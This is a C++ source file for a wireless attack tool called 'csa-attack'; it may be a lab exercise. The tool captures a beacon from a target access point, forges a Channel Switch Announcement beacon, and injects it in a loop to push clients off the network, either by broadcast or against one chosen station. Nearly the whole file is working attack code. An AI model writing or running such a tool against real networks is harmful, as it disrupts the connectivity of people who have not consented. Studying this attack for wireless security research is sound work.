#include <iostream>
#include <string>
#include <vector>
#include <atomic>
#include <csignal>
#include <stdexcept>

#include <unistd.h>
#include <pcap.h>

#include "mac.h"
#include "dot11.h"
#include "frame.h"

static std::atomic<bool> g_running(true);

static void on_sigint(int) { g_running.store(false); }

static void usage() {
    std::cout
        << "syntax : csa-attack <interface> <ap mac> [<station mac>]\n"
        << "sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

static bool capture_one(pcap_t* pcap, std::vector<uint8_t>& outBuf) {
    while (g_running.load()) {
        pcap_pkthdr*   hdr = nullptr;
        const uint8_t* pkt = nullptr;
        int rc = pcap_next_ex(pcap, &hdr, &pkt);
        if (rc == 0)                continue;
        if (rc == PCAP_ERROR_BREAK) return false;
        if (rc < 0) {
            std::cerr << "pcap_next_ex : " << pcap_geterr(pcap) << "\n";
            return false;
        }
        outBuf.assign(pkt, pkt + hdr->caplen);
        return true;
    }
    return false;
}

static bool capture_first_beacon(pcap_t* pcap, const Mac& apMac, std::vector<uint8_t>& outBeacon) {
    std::string filter_exp = "type mgt subtype beacon and wlan addr3 " + apMac.toString();

    bpf_program fp;
    if (pcap_compile(pcap, &fp, filter_exp.data(), 1, PCAP_NETMASK_UNKNOWN) < 0) {
        std::cerr << "pcap_compile : " << pcap_geterr(pcap) << "\n";
        return false;
    }
    if (pcap_setfilter(pcap, &fp) < 0) {
        std::cerr << "pcap_setfilter : " << pcap_geterr(pcap) << "\n";
        pcap_freecode(&fp);
        return false;
    }
    pcap_freecode(&fp);

    std::cout << "[*] capturing beacon frame from " << apMac.toString()
              << " ... (Ctrl+C to abort)" << std::endl;

    return capture_one(pcap, outBeacon);
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        usage();
        return 1;
    }

    const char* ifname     = argv[1];
    Mac         apMac;
    Mac         staMac;
    bool        hasStation = false;

    try {
        apMac = Mac(argv[2]);
    } catch (const std::invalid_argument&) {
        std::cerr << "AP MAC 주소 형식이 올바르지 않습니다: " << argv[2] << "\n";
        return 1;
    }

    if (argc == 4) {
        try {
            staMac = Mac(argv[3]);
        } catch (const std::invalid_argument&) {
            std::cerr << "Station MAC 주소 형식이 올바르지 않습니다: " << argv[3] << "\n";
            return 1;
        }
        hasStation = true;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(ifname, 65535, 1, 500, errbuf);
    if (!pcap) {
        std::cerr << "pcap_open_live : " << errbuf << "\n"
                  << "  -> root 권한과 monitor mode 인터페이스를 확인하세요.\n";
        return 1;
    }

    int dlt = pcap_datalink(pcap);
    if (dlt != DLT_IEEE802_11_RADIO) {
        std::cerr << "interface '" << ifname
                  << "' 는 monitor mode (radiotap) 가 아닙니다. "
                  << "current DLT = " << dlt << "\n";
        pcap_close(pcap);
        return 1;
    }

    std::signal(SIGINT,  on_sigint);
    std::signal(SIGTERM, on_sigint);

    std::cout << "[*] interface : " << ifname           << "\n"
              << "[*] ap        : " << apMac.toString() << "\n";
    if (hasStation)
        std::cout << "[*] station   : " << staMac.toString() << "\n";
    std::cout << "[*] target    : "
              << (hasStation ? "AP unicast" : "AP broadcast")
              << "\n";

    std::vector<uint8_t> beaconBuf;
    if (!capture_first_beacon(pcap, apMac, beaconBuf)) {
        pcap_close(pcap);
        return 0;
    }
    std::cout << "[+] captured beacon : " << beaconBuf.size() << " bytes\n";

    uint8_t outFrame[2048];
    size_t  outLen = build_csa_beacon(
        outFrame,
        sizeof(outFrame),
        beaconBuf.data(),
        beaconBuf.size(),
        hasStation,
        staMac
    );
    if (outLen == 0) {
        std::cerr << "CSA frame 생성 실패 (캡처된 프레임이 잘못되었거나 너무 큽니다)\n";
        pcap_close(pcap);
        return 1;
    }
    std::cout << "[+] built CSA/ECSA frame : " << outLen << " bytes\n"
              << "[*] starting CSA attack ... (Ctrl+C to stop)" << std::endl;

    Dot11*        macHdr     = reinterpret_cast<Dot11*>(outFrame + sizeof(Dot11RadioTap));
    uint16_t      tx_seqCtrl = 0;
    unsigned long sent_ok    = 0;

    while (g_running.load()) {
        macHdr->seqNum(tx_seqCtrl);

        if (pcap_sendpacket(pcap, outFrame, static_cast<int>(outLen)) != 0) {
            std::cerr << "pcap_sendpacket : " << pcap_geterr(pcap) << "\n";
            break;
        }
        ++sent_ok;

        if (sent_ok % 20 == 0) {
            std::cout << "[+] CSA sent : ok=" << sent_ok
                      << " (" << outLen << " bytes)" << std::endl;
        }

        usleep(100 * 1000);
    }

    std::cout << "\n[*] stopping ... total ok=" << sent_ok << "\n";

    pcap_close(pcap);
    return 0;
}
